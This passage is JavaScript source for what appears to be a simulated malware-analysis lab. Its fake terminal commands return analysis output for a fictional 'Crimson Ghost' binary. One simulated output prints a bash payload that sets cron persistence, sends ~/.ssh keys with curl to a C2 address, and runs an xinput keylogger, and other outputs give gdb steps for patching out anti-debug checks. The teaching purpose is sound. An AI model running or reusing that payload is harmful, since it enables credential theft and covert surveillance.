MTkyLjE2OC4xMy4zNw==
Connection established
Receiving payload...
Payload decrypted successfully
Executing stage 2...
/tmp/.cg_payload
Anti-tamper check failed. Exiting.
Debug environment detected.
GCC: (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
.symtab
.strtab
.shstrtab
.text
.rodata
.data
.bss`;
            }

            if (!target) return 'Usage: strings <filename>';
            return `strings: '${target}': No such file`;
        },

        // ── echo — supports base64 decode piping ───────────────────────
        'echo': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // Handle: echo "MTkyLjE2OC4xMy4zNw==" | base64 -d
            if (fullCmd.includes('MTkyLjE2OC4xMy4zNw==') && fullCmd.includes('base64')) {
                A16Config._state.c2Identified = true;
                return '192.168.13.37';
            }

            // Handle: echo "string" | base64 -d (generic)
            const b64Match = fullCmd.match(/["']([A-Za-z0-9+/=]+)["']\s*\|\s*base64\s+-d/);
            if (b64Match) {
                try {
                    return atob(b64Match[1]);
                } catch(e) {
                    return 'base64: invalid input';
                }
            }

            // Handle: echo "string" | base64 (encode)
            const encMatch = fullCmd.match(/["']([^"']+)["']\s*\|\s*base64(?!\s+-d)/);
            if (encMatch) {
                try {
                    return btoa(encMatch[1]);
                } catch(e) {
                    return encMatch[1];
                }
            }

            // Plain echo
            const text = fullCmd.replace(/^["']|["']$/g, '');
            return text;
        },

        // ── base64 — decode/encode utility ─────────────────────────────
        'base64': function(args, term, engine) {
            const decodeFlag = args.includes('-d') || args.includes('--decode');
            const input = args.find(a => !a.startsWith('-'));

            if (!input) return 'Usage: base64 [-d] <string>';

            if (decodeFlag) {
                if (input === 'MTkyLjE2OC4xMy4zNw==') {
                    A16Config._state.c2Identified = true;
                    return '192.168.13.37';
                }
                try { return atob(input); }
                catch(e) { return 'base64: invalid input'; }
            }

            try { return btoa(input); }
            catch(e) { return input; }
        },

        // ── readelf — ELF header inspection ────────────────────────────
        'readelf': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401000
  Start of program headers:          64 (bytes into file)
  Start of section headers:          14832 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)

Section Headers:
  [Nr] Name              Type             Address           Offset    Size
  [ 0]                   NULL             0000000000000000  00000000  0000000000000000
  [ 1] .text             PROGBITS         0000000000401000  00001000  0000000000000a20
  [ 2] .rodata           PROGBITS         0000000000402000  00002000  0000000000000340
  [ 3] .data             PROGBITS         0000000000403000  00003000  00000000000000c8
  [ 4] .bss              NOBITS           0000000000404000  000030c8  0000000000000040
  [ 5] .dynamic          DYNAMIC          0000000000403100  00003100  00000000000001a0

Dynamic section:
  Tag        Type                         Name/Value
  0x0000000000000001 (NEEDED)             Shared library: [libssl.so.3]
  0x0000000000000001 (NEEDED)             Shared library: [libcrypto.so.3]
  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]

Symbol table (.dynsym):
  Num:    Value          Size Type    Bind   Name
    1: 0000000000000000     0 FUNC    GLOBAL socket@GLIBC_2.34
    2: 0000000000000000     0 FUNC    GLOBAL connect@GLIBC_2.34
    3: 0000000000000000     0 FUNC    GLOBAL send@GLIBC_2.34
    4: 0000000000000000     0 FUNC    GLOBAL recv@GLIBC_2.34
    5: 0000000000000000     0 FUNC    GLOBAL ptrace@GLIBC_2.34
    6: 0000000000000000     0 FUNC    GLOBAL fork@GLIBC_2.34
    7: 0000000000000000     0 FUNC    GLOBAL malloc@GLIBC_2.34
    8: 0000000000000000     0 FUNC    GLOBAL memcpy@GLIBC_2.34
    9: 0000000000000000     0 FUNC    GLOBAL EVP_DecryptInit_ex@OPENSSL_3.0
   10: 0000000000000000     0 FUNC    GLOBAL EVP_DecryptUpdate@OPENSSL_3.0
   11: 0000000000000000     0 FUNC    GLOBAL EVP_DecryptFinal_ex@OPENSSL_3.0
   12: 0000000000000000     0 FUNC    GLOBAL EVP_aes_256_cbc@OPENSSL_3.0
   13: 0000000000000000     0 FUNC    GLOBAL EVP_CIPHER_CTX_new@OPENSSL_3.0`;
            }

            if (!target) return 'Usage: readelf <option(s)> elf-file(s)';
            return `readelf: Error: '${target}': No such file`;
        },

        // ── checksec — binary security features ────────────────────────
        'checksec': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-') && !a.startsWith('--')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost' ||
                target === '/home/kali/crimson_ghost' ||
                args.includes('--file=crimson_ghost') || args.includes('--file=./crimson_ghost')) {
                return `RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   Stripped

[*] Binary analysis:
    - No stack canary: buffer overflows won't be detected
    - NX enabled: cannot execute shellcode on the stack
    - No PIE: fixed addresses — predictable for breakpoints
    - Stripped: no debug symbols — harder to reverse engineer
    - Partial RELRO: GOT is writable — potential for GOT overwrite`;
            }

            if (!target && !args.some(a => a.startsWith('--file='))) return 'Usage: checksec [--file=<binary>] <binary>';
            return `checksec: '${target}': No such file or directory`;
        },

        // ── sha256sum — file hash ──────────────────────────────────────
        'sha256sum': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost') {
                return 'a3f8c9d1e7b2450f6a8d3c1e9f0b7a2d5c4e8f1a6b3d9e0c7f2a5b8d1e4c7f0a  crimson_ghost';
            }
            if (target === 'crimson_ghost.pcap' || target === './crimson_ghost.pcap') {
                return 'b7c2d4e6f8a0b1c3d5e7f9a1b3c5d7e9f0a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0  crimson_ghost.pcap';
            }

            if (!target) return 'Usage: sha256sum <file>';
            return `sha256sum: ${target}: No such file or directory`;
        },

        // ── objdump — disassembly ──────────────────────────────────────
        'objdump': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `
crimson_ghost:     file format elf64-x86-64

Disassembly of section .text:

0000000000401000 <.text>:
  ; === Entry point ===
  401000:  48 83 ec 08          sub    $0x8,%rsp
  401004:  e8 87 00 00 00       call   0x401090        ; <-- anti_debug_check()
  401009:  85 c0                test   %eax,%eax
  40100b:  75 5e                jne    0x40106b         ; if debugger detected, jump to exit

  ; === Decode C2 address (base64) ===
  40100d:  48 8d 3d ec 0f 00 00 lea    0xfec(%rip),%rdi  ; "MTkyLjE2OC4xMy4zNw=="
  401014:  e8 a7 00 00 00       call   0x4010c0        ; <-- base64_decode()
  401019:  48 89 c7             mov    %rax,%rdi        ; decoded C2 IP in rdi
  40101c:  be 5b 11 00 00       mov    $0x115b,%esi     ; port 4443

  ; === Connect to C2 ===
  401021:  e8 ca 00 00 00       call   0x4010f0        ; <-- c2_connect(ip, port)
  401026:  48 89 c3             mov    %rax,%rbx        ; socket fd in rbx
  401029:  48 85 c0             test   %rax,%rax
  40102c:  78 3d                js     0x40106b         ; connection failed -> exit

  ; === Receive encrypted payload ===
  40102e:  48 89 df             mov    %rbx,%rdi
  401031:  e8 0a 01 00 00       call   0x401140        ; <-- recv_payload(socket)
  401036:  48 89 c6             mov    %rax,%rsi        ; encrypted buffer

  ; === XOR decryption routine ===
  401039:  48 8d 3d 60 01 00 00 lea    0x160(%rip),%rdi  ; XOR key loaded into rdi
  401040:  e8 5b 01 00 00       call   0x4011a0        ; <-- xor_decrypt(key, buffer)

  ; === Execute decrypted payload ===
  401045:  48 89 c7             mov    %rax,%rdi
  401048:  e8 a3 01 00 00       call   0x4011f0        ; <-- drop_and_exec(payload)
  40104d:  31 c0                xor    %eax,%eax
  40104f:  48 83 c4 08          add    $0x8,%rsp
  401053:  c3                   ret

  ...

  ; === anti_debug_check() ===
  401090:  b8 65 00 00 00       mov    $0x65,%eax       ; __NR_ptrace = 101
  401095:  31 ff                xor    %edi,%edi        ; PTRACE_TRACEME = 0
  401097:  31 f6                xor    %esi,%esi
  401099:  31 d2                xor    %edx,%edx
  40109b:  0f 05                syscall                  ; ptrace(PTRACE_TRACEME, 0, 0, 0)
  40109d:  48 83 f8 ff          cmp    $0xffffffffffffffff,%rax
  4010a1:  0f 94 c0             sete   %al              ; al=1 if ptrace failed (debugger present)
  4010a4:  0f b6 c0             movzbl %al,%eax
  4010a7:  c3                   ret

  ; === Exit on debug detection ===
  40106b:  48 8d 3d 8e 0f 00 00 lea    0xf8e(%rip),%rdi  ; "Debug environment detected."
  401072:  e8 00 00 00 00       call   puts
  401077:  bf 01 00 00 00       mov    $0x1,%edi
  40107c:  e8 00 00 00 00       call   exit

  ; === base64_decode() ===
  4010c0:  55                   push   %rbp
  4010c1:  48 89 e5             mov    %rsp,%rbp
  ; ... (standard base64 decode implementation, ~60 bytes)
  4010ff:  c3                   ret

  ; === c2_connect(ip, port) ===
  4010f0:  55                   push   %rbp
  4010f1:  48 89 e5             mov    %rsp,%rbp
  ; ... (socket + connect, ~80 bytes)
  40113f:  c3                   ret

  ; === recv_payload(socket) ===
  401140:  55                   push   %rbp
  401141:  48 89 e5             mov    %rsp,%rbp
  ; ... (recv loop, ~90 bytes)
  40119f:  c3                   ret

  ; === xor_decrypt(key, buffer) ===
  4011a0:  55                   push   %rbp
  4011a1:  48 89 e5             mov    %rsp,%rbp
  4011a4:  48 89 7d f8          mov    %rdi,-0x8(%rbp)   ; key pointer
  4011a8:  48 89 75 f0          mov    %rsi,-0x10(%rbp)  ; buffer pointer
  4011ac:  31 c0                xor    %eax,%eax          ; i = 0
  4011ae:  48 89 c6             mov    %rax,%rsi
  ; XOR loop:
  4011b1:  48 8b 07             mov    (%rdi),%rax        ; load key byte
  4011b4:  30 04 0e             xor    %al,(%rsi,%rcx,1)  ; XOR buffer[i] with key[i%len]
  4011b7:  48 ff c1             inc    %rcx
  4011ba:  48 39 d1             cmp    %rdx,%rcx
  4011bd:  75 f2                jne    0x4011b1           ; loop
  4011bf:  48 89 f0             mov    %rsi,%rax
  4011c2:  5d                   pop    %rbp
  4011c3:  c3                   ret

  ; === drop_and_exec(payload) ===
  4011f0:  55                   push   %rbp
  4011f1:  48 89 e5             mov    %rsp,%rbp
  ; ... (open /tmp/.cg_payload, write, chmod, execve, ~80 bytes)
  40124f:  c3                   ret`;
            }

            if (!target) return 'Usage: objdump <option(s)> <file(s)>';
            return `objdump: '${target}': No such file`;
        },

        // ── ltrace — library call tracing ──────────────────────────────
        'ltrace': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === './crimson_ghost' || target === 'crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `[pid 3847] __libc_start_main(0x401000, 1, 0x7ffc8a3b2e08, ...)
[pid 3847] ptrace(0, 0, 0, 0)                                = -1
[pid 3847] puts("Debug environment detected.")                = 28
[pid 3847] exit(1 <no return ...>)
[pid 3847] +++ exited (status 1) +++

[!] Binary detected ltrace and terminated.
    The ptrace(PTRACE_TRACEME) anti-debug check caught the tracer.
    Bypass: Patch out the ptrace call or use LD_PRELOAD to hook ptrace.`;
            }

            if (!target) return 'Usage: ltrace [option ...] <program> [args ...]';
            return `ltrace: Can't execute '${target}': No such file or directory`;
        },

        // ── strace — system call tracing ───────────────────────────────
        'strace': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === './crimson_ghost' || target === 'crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `execve("./crimson_ghost", ["./crimson_ghost"], 0x7ffc8a3b2e08 /* 42 vars */) = 0
brk(NULL)                               = 0x55a4c8e3f000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libssl.so.3", O_RDONLY|O_CLOEXEC) = 3
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libcrypto.so.3", O_RDONLY|O_CLOEXEC) = 4
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 5
mmap(NULL, 2228480, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 5, 0) = 0x7f2a8c200000
ptrace(PTRACE_TRACEME, 0, NULL, NULL)   = -1 EPERM (Operation not permitted)
write(1, "Debug environment detected.\\n", 28) = 28
exit_group(1)                           = ?
+++ exited with 1 +++

[!] The binary called ptrace(PTRACE_TRACEME) to detect strace.
    When strace is attached, ptrace returns -1 EPERM.
    The binary detected this and terminated immediately.
    Address: 0x401090 — patch this check to bypass anti-debug.`;
            }

            if (!target) return 'Usage: strace [-CdffhiqrtttTvVwxxy] [-e expr] ... [-p pid] [-o file] [program [args]]';
            return `strace: Can't stat '${target}': No such file or directory`;
        },

        // ── tcpdump — network traffic capture ──────────────────────────
        'tcpdump': function(args, term, engine) {
            A16Config._state.sandboxRun = true;

            const hasInterface = args.includes('-i');
            const hasRead = args.includes('-r');

            // Reading the pcap file
            if (hasRead) {
                const pcapFile = args[args.indexOf('-r') + 1] || '';
                if (pcapFile.includes('crimson_ghost.pcap') || pcapFile === 'crimson_ghost.pcap') {
                    A16Config._state.c2Identified = true;
                    return `reading from file crimson_ghost.pcap, link-type EN10MB (Ethernet)
14:32:01.441223 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [S], seq 3847291, win 64240, length 0
14:32:01.471842 IP 192.168.13.37.4443 > 10.0.2.15.48392: Flags [S.], seq 9182734, ack 3847292, win 65535, length 0
14:32:01.471901 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [.], ack 1, win 64240, length 0
14:32:01.482103 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [P.], seq 1:65, ack 1, win 64240, length 64
  0x0000:  4500 0068 a1b3 4000 4006 1c2f 0a00 020f  E..h..@.@../....
  0x0010:  c0a8 0d25 bd08 115b 003a d88b 008c 2c4f  ...%...[.:....,O
  0x0020:  5018 fb00 4321 0000 4347 0201 0100 0000  P...C!..CG......
  0x0030:  0000 0000 0000 0000 0000 0000 0000 0000  ................
14:32:01.512449 IP 192.168.13.37.4443 > 10.0.2.15.48392: Flags [P.], seq 1:2049, ack 65, win 65535, length 2048
  0x0000:  4500 0830 b2c4 4000 4006 0b1e c0a8 0d25  E..0..@.@......%
  0x0010:  0a00 020f 115b bd08 008c 2c4f 003a d8cb  .....[....,O.:..
  0x0020:  5018 ffff 9a12 0000 4347 0202 01ff 8a3c  P.......CG.....<
  0x0030:  e7b2 c4d1 a9f6 0e5b 3d71 82c0 f4a8 d6e3  .......[=q......
14:32:01.512501 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [.], ack 2049, win 64240, length 0
14:32:01.523117 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [F.], seq 65, ack 2049, win 64240, length 0
14:32:01.553392 IP 192.168.13.37.4443 > 10.0.2.15.48392: Flags [F.], seq 2049, ack 66, win 65535, length 0

8 packets captured
8 packets received by filter
0 packets dropped by kernel

[*] C2 server identified: 192.168.13.37:4443
[*] Custom protocol header: 0x4347 ("CG" — CrimsonGhost)
[*] Payload received: 2048 bytes (encrypted)`;
                }
            }

            // Live capture
            if (hasInterface || args.length === 0 || args.every(a => a.startsWith('-'))) {
                return `tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:32:01.441223 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [S], seq 3847291, win 64240, length 0
14:32:01.471842 IP 192.168.13.37.4443 > 10.0.2.15.48392: Flags [S.], seq 9182734, ack 3847292, win 65535, length 0
14:32:01.471901 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [.], ack 1, win 64240, length 0
14:32:01.482103 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [P.], seq 1:65, ack 1, win 64240, length 64
14:32:01.512449 IP 192.168.13.37.4443 > 10.0.2.15.48392: Flags [P.], seq 1:2049, ack 65, win 65535, length 2048
14:32:01.523117 IP 10.0.2.15.48392 > 192.168.13.37.4443: Flags [F.], seq 65, ack 2049, win 64240, length 0

6 packets captured

[*] Outbound connection detected: 10.0.2.15 -> 192.168.13.37:4443
[*] Protocol: custom binary (header 0x4347 = "CG")`;
            }

            return 'Usage: tcpdump [-i interface] [-r file] [expression]';
        },

        // ── wireshark — PCAP analysis (text mode) ──────────────────────
        'wireshark': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost.pcap' || target === './crimson_ghost.pcap') {
                A16Config._state.c2Identified = true;
                return `Wireshark (tshark mode — terminal output)
Loading: crimson_ghost.pcap

=== Capture Summary ===
  File:       crimson_ghost.pcap
  Packets:    8
  Duration:   0.112s
  Data:       2,241 bytes

=== Conversation ===
  10.0.2.15:48392 <-> 192.168.13.37:4443 (TCP)
  8 packets, 2,177 bytes payload

=== Protocol Decode ===
Packet 4 (Client -> Server, 64 bytes):
  Magic:    0x4347 ("CG" — CrimsonGhost protocol)
  Version:  0x02 0x01
  Type:     0x01 (BEACON / Initial handshake)
  Payload:  [null padded, 60 bytes]

Packet 5 (Server -> Client, 2048 bytes):
  Magic:    0x4347 ("CG" — CrimsonGhost protocol)
  Version:  0x02 0x02
  Type:     0x01 (PAYLOAD_DELIVERY)
  Flags:    0xFF (encrypted)
  Payload:  [encrypted blob, 2040 bytes]
            XOR pattern detected in first 16 bytes
            Encryption: likely XOR with static key + AES-256-CBC outer layer

=== Network Indicators (IOCs) ===
  C2 Server:     192.168.13.37
  C2 Port:       4443/tcp
  Protocol:      Custom binary ("CG" magic header)
  User-Agent:    none (raw socket connection)
  TLS:           none (custom encryption layer)

=== Anomalies ===
  [!] No TLS — custom encryption used instead of standard TLS
  [!] Fixed-size beacon (64 bytes) — possible implant fingerprint
  [!] C2 port 4443 — commonly used by malware to mimic HTTPS`;
            }

            if (!target) return 'Usage: wireshark <pcap-file> (terminal/tshark mode)';
            return `wireshark: '${target}': No such file or directory`;
        },

        // ── gdb — GNU Debugger (interactive simulation) ────────────────
        'gdb': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === './crimson_ghost' || target === 'crimson_ghost' || target === '/home/kali/crimson_ghost') {
                A16Config._state.gdbActive = true;
                // Install GDB sub-commands
                A16Config._installGdbCommands(engine);
                return `GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later
This GDB was configured as "x86_64-linux-gnu".
Reading symbols from ./crimson_ghost...
(No debugging symbols found in ./crimson_ghost)

Loaded binary: crimson_ghost (stripped ELF64)
Entry point: 0x401000

(gdb) Type GDB commands: run, break, set, x/s, info, disas, continue, quit`;
            }

            if (!target) return 'Usage: gdb <binary>';
            return `gdb: '${target}': No such file or directory.`;
        },

        // ── python3 — run decrypt.py ───────────────────────────────────
        'python3': function(args, term, engine) {
            const script = args.find(a => a.endsWith('.py')) || '';

            if (script.includes('decrypt.py') || script === 'tools/decrypt.py' || script === './tools/decrypt.py') {
                const key = args.find(a => !a.endsWith('.py') && !a.startsWith('-'));

                if (!key) {
                    return `Usage: python3 decrypt.py <key>
Extract the key from the XOR routine at 0x4011a0 using GDB.
Hint: Set breakpoint at 0x4011a0, run with anti-debug bypassed, then x/s $rdi`;
                }

                if (key === 'Gh0stK3y_X0R_2024' || key === '"Gh0stK3y_X0R_2024"' || key === "'Gh0stK3y_X0R_2024'") {
                    return `[*] Crimson Ghost Payload Decryptor
[*] Decrypting payload with key: Gh0stK3y_X0R_2024
[*] Reading encrypted payload from /tmp/.cg_payload...
[*] Applying XOR decryption (key length: 18)...
[*] Stage 1: XOR layer removed
[*] Stage 2: AES-256-CBC decryption...
[+] Decryption successful!

=== DECRYPTED PAYLOAD ===
#!/bin/bash
# Crimson Ghost — Stage 2 Payload
# Ghost Protocol v2.1

# Establish persistence
cp /tmp/.cg_payload /usr/local/bin/.system_update
chmod +x /usr/local/bin/.system_update
echo "*/5 * * * * /usr/local/bin/.system_update" | crontab -

# Exfiltrate SSH keys
tar czf /tmp/.keys.tar.gz ~/.ssh/ 2>/dev/null
curl -X POST http://192.168.13.37:4443/exfil -d @/tmp/.keys.tar.gz

# Keylogger
xinput list | grep -i keyboard | grep -oP 'id=\\K\\d+' | while read id; do
    xinput test "$id" >> /tmp/.keylog &
done

# Root flag embedded as verification hash
# {{FLAG:root}}

echo "[*] Ghost Protocol active"
=========================

[+] Root flag found: {{FLAG:root}}
[+] Payload functionality: persistence + SSH key exfiltration + keylogger`;
                }

                return `[*] Crimson Ghost Payload Decryptor
[*] Decrypting payload with key: ${key}
[*] Reading encrypted payload from /tmp/.cg_payload...
[*] Applying XOR decryption (key length: ${key.replace(/['"]/g, '').length})...
[-] Decryption failed: output is garbled (wrong key)
[-] Expected readable shell script, got binary noise

[!] Make sure you extracted the correct key from the XOR routine.
    In GDB: break *0x4011a0, then x/s $rdi to read the key string.`;
            }

            if (script) return `python3: can't open file '${script}': [Errno 2] No such file or directory`;
            return `Python 3.11.6 (main, Oct  8 2023, 05:06:43) [GCC 13.2.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> (use python3 <script.py> to run scripts)`;
        },

        // ── nmap — network scan ────────────────────────────────────────
        'nmap': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === '192.168.13.37') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.13.37
Host is up (0.042s latency).
Not shown: 998 closed tcp ports

PORT      STATE    SERVICE
4443/tcp  open     pharos
8443/tcp  filtered https-alt

Service Info: OS: Linux

Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds

[*] C2 server is live on port 4443 (custom protocol)`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Not shown: 999 closed tcp ports

PORT     STATE  SERVICE
5000/tcp open   http       Cuckoo Sandbox Web UI

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`;
            }

            if (!target) return 'Usage: nmap [Scan Type(s)] [Options] {target specification}';
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down.
Nmap done: 1 IP address (0 hosts up) scanned in 3.11 seconds`;
        },

        // ── netstat — network connections ──────────────────────────────
        'netstat': function(args) {
            return `Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:48392         192.168.13.37:4443      TIME_WAIT`;
        },

        // ── lsof — list open files ─────────────────────────────────────
        'lsof': function(args) {
            if (args.includes('-i')) {
                return `COMMAND       PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
firefox      1201 kali   42u  IPv4  28371      0t0  TCP kali:52840->localhost:5000 (ESTABLISHED)`;
            }
            return `COMMAND       PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
bash          982 kali  cwd    DIR    8,1     4096 131073 /home/kali
bash          982 kali    0u   CHR  136,0      0t0      3 /dev/pts/0`;
        },

        // ── yara — YARA rule scanning ──────────────────────────────────
        'yara': function(args, term, engine) {
            const rule = args.find(a => a.endsWith('.yar') || a.endsWith('.yara'));
            const target = args.find(a => a === 'crimson_ghost' || a === './crimson_ghost');

            if (rule && target) {
                return `CrimsonGhost crimson_ghost
  $magic at 0x2040
  $b64_c2 at 0x2060
  $xor_loop at 0x4011b1
  $ptrace at 0x2088

[+] YARA match: CrimsonGhost rule matched 4/4 strings
[+] Classification: Known malware variant — CrimsonGhost v2.x family`;
            }

            if (!rule) return 'Usage: yara <rules_file.yar> <target_file>';
            return `yara: could not open file '${target || args[1]}': No such file`;
        },

        // ── grep — search within files ─────────────────────────────────
        'grep': function(args, term, engine) {
            const pattern = args.find(a => !a.startsWith('-'));
            const hasRecurse = args.includes('-r') || args.includes('-R');

            if (!pattern) return 'Usage: grep [OPTION]... PATTERN [FILE]...';

            // Common patterns users might grep for
            if (pattern.includes('base64') || pattern.includes('MTky') || pattern.includes('b64')) {
                return 'Binary file crimson_ghost matches';
            }
            if (pattern.includes('flag') || pattern.includes('FLAG')) {
                return `notes.txt:  user.txt — C2 server address\nnotes.txt:  root.txt — Ghost Protocol decryption key`;
            }
            if (pattern.includes('ptrace')) {
                return 'Binary file crimson_ghost matches';
            }
            if (pattern.includes('192.168')) {
                return 'crimson_ghost.pcap: (binary match)';
            }

            return `grep: ${pattern}: No match found`;
        },

        // ── xxd — hex dump ─────────────────────────────────────────────
        'xxd': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost') {
                return `00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 0010 4000 0000 0000  ..>.......@.....
00000020: 4000 0000 0000 0000 f039 0000 0000 0000  @........9......
00000030: 0000 0000 4000 3800 0b00 4000 1d00 1c00  ....@.8...@.....
...
00002040: 4372 696d 736f 6e47 686f 7374 2076 322e  CrimsonGhost v2.
00002050: 3100 5b2a 5d20 496e 6974 6961 6c69 7a69  1.[*] Initializi
00002060: 4d54 6b79 4c6a 4532 4f43 3478 4d79 347a  MTkyLjE2OC4xMy4z
00002070: 4e77 3d3d 0043 6f6e 6e65 6374 696e 6720  Nw==.Connecting
00002080: 746f 2063 6f6d 6d61 6e64 206e 6f64 652e  to command node.
00002090: 2e2e 0070 7472 6163 6500 4465 6275 6720  ...ptrace.Debug
000020a0: 656e 7669 726f 6e6d 656e 7420 6465 7465  environment dete
000020b0: 6374 6564 2e00 2f74 6d70 2f2e 6367 5f70  cted../tmp/.cg_p
000020c0: 6179 6c6f 6164 0047 6830 7374 4b33 795f  ayload.Gh0stK3y_
000020d0: 5830 525f 3230 3234 0045 5650 5f44 6563  X0R_2024.EVP_Dec
...
(output truncated — binary file, use objdump -d for disassembly)`;
            }

            if (!target) return 'Usage: xxd [options] [infile]';
            return `xxd: ${target}: No such file or directory`;
        },

        // ── ping — connectivity check ──────────────────────────────────
        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '192.168.13.37') {
                return `PING 192.168.13.37 (192.168.13.37) 56(84) bytes of data.
64 bytes from 192.168.13.37: icmp_seq=1 ttl=64 time=42.3 ms
64 bytes from 192.168.13.37: icmp_seq=2 ttl=64 time=41.8 ms
64 bytes from 192.168.13.37: icmp_seq=3 ttl=64 time=42.1 ms

--- 192.168.13.37 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 41.8/42.1/42.3/0.204 ms`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                return `PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from localhost: icmp_seq=2 ttl=64 time=0.028 ms

--- localhost ping statistics ---
2 packets transmitted, 2 received, 0% packet loss`;
            }

            return `ping: ${target}: Name or service not known`;
        },

        // ── curl — HTTP requests ───────────────────────────────────────
        'curl': function(args, term, engine) {
            const url = args.find(a => a.startsWith('http')) || '';
            if (!url) return "curl: try 'curl --help' for more information";

            if (url.includes('localhost:5000') || url.includes('127.0.0.1:5000')) {
                return `<!DOCTYPE html>
<html><head><title>Cuckoo Sandbox</title></head>
<body>
<h1>Cuckoo Sandbox — Analysis Dashboard</h1>
<p>Recent Analysis: crimson_ghost (Report #2024-CG-0091)</p>
<p>Threat Score: 9.2/10 — MALICIOUS</p>
<p>View full report in browser: http://localhost:5000/</p>
</body></html>`;
            }

            if (url.includes('192.168.13.37')) {
                return `curl: (28) Connection timed out after 10001 milliseconds

[*] The C2 server at 192.168.13.37:4443 uses a custom binary protocol.
    Standard HTTP requests will not receive a valid response.
    Use tcpdump/wireshark on the PCAP file to analyze the protocol.`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        // ── chmod — change permissions ─────────────────────────────────
        'chmod': function(args) {
            if (args.length === 0) return 'Usage: chmod [options] <mode> <file>';
            return 'chmod: mode changed';
        },

        // ── md5sum — file hash ─────────────────────────────────────────
        'md5sum': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (target === 'crimson_ghost' || target === './crimson_ghost') {
                return 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9  crimson_ghost';
            }
            if (!target) return 'Usage: md5sum <file>';
            return `md5sum: ${target}: No such file or directory`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // GDB SUB-COMMAND SYSTEM
    // Installs GDB commands into the terminal when gdb is active
    // ═══════════════════════════════════════════════════════

    _installGdbCommands(engine) {
        const gdbCmds = {

            'run': function(args, term, engine) {
                if (!A16Config._state.gdbPtracePatched) {
                    return `Starting program: /home/kali/crimson_ghost

Program received signal SIGTRAP, Trace/breakpoint trap.
0x000000000040109d in ?? ()

[!] The binary's anti-debug check triggered.
    ptrace(PTRACE_TRACEME) detected GDB and raised SIGTRAP.
    The check is at 0x401090. Patch it out before running:

    (gdb) set *(int*)0x401090 = 0x90909090
    (gdb) set *(int*)0x401094 = 0x90909090
    (gdb) set *(short*)0x401098 = 0x9090
    (gdb) set *(byte*)0x40109a = 0x90

    Or just NOP the first instruction:
    (gdb) set *(int*)0x401090 = 0x90909090`;
                }

